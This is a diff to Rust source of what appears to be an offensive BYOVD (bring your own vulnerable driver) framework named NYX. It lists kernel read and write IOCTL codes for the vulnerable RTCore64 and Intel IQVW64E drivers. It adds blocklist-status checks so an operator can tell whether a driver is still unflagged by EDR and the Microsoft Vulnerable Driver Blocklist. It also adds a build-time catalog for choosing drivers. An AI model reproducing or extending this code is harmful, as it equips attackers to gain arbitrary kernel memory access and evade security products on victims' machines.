@@ -76,6 +76,8 @@ pub trait VulnDriverIoctl: Send + Sync {
     /// Offset of the address field in the per-driver MemoryOperation struct.
     /// RTCore64 = 0x08, IQVW64E = 0x00.
     fn addr_offset(&self) -> usize { 0x08 }
+    /// Human-readable blocklist status. Logged at bootstrap. Purely informational.
+    fn blocklist_status(&self) -> &'static str { "unknown" }
     /// Pack a read/write request into the driver's input buffer. Default uses
     /// the generic [`RwPacket`]; drivers with a different layout override.
     fn pack(&self, code: u32, addr: u64, buf: *mut u8, size: u32) -> [u8; 32] {
@@ -154,6 +156,9 @@ impl VulnDriverIoctl for RtCore64 {
     fn write_ioctl(&self) -> u32 {
         0x8000204C
     }
+    fn blocklist_status(&self) -> &'static str {
+        "BLOCKLISTED: on all major EDR + Microsoft Vulnerable Driver Blocklist since 2020"
+    }
 }
 
 /// Alternative: Intel IQVW64E.sys (CVE-2022-24245). Less flagged than RTCore64.
@@ -175,6 +180,9 @@ impl VulnDriverIoctl for Iqvw64e {
     fn addr_offset(&self) -> usize { 0x00 }
     fn read_ioctl(&self) -> u32 { 0x80802010 }
     fn write_ioctl(&self) -> u32 { 0x80802014 }
+    fn blocklist_status(&self) -> &'static str {
+        "BLOCKLISTED: on Microsoft Vulnerable Driver Blocklist since 2023"
+    }
 }
 
 // ---- DeviceIoControl FFI (resolved by the operator host's kernel32) -------
@@ -439,6 +447,22 @@ pub fn resolve_kernel_symbol(ntoskrnl_image: &[u8], name: &[u8]) -> Option<u32> 
         }
     }
     None
+}
+
+// ---- Driver pack (pluggable BYOVD catalog) ----
+// Add new drivers in byovd_drivers/<name>.rs, implement VulnDriverIoctl.
+// (drivers declared via pub use from lib.rs)
+
+/// Select the default driver via build config.
+/// `NYX_BYOVD=wdtkernel|shield|rtcore64|iqvw64e` (unset → Shield).
+/// Run `blocklist_status()` on the selected driver to check if it's still clean.
+pub fn default_driver() -> Box<dyn VulnDriverIoctl> {
+    match option_env!("NYX_BYOVD") {
+        Some("wdtkernel") => Box::new(crate::byovd_drivers::wdtkernel::WdtKernel),
+        Some("rtcore64") => Box::new(RtCore64),
+        Some("iqvw64e") => Box::new(Iqvw64e),
+        _ => Box::new(crate::byovd_drivers::shield::Shield),
+    }
 }
 
 fn djb2(s: &[u8]) -> u32 {
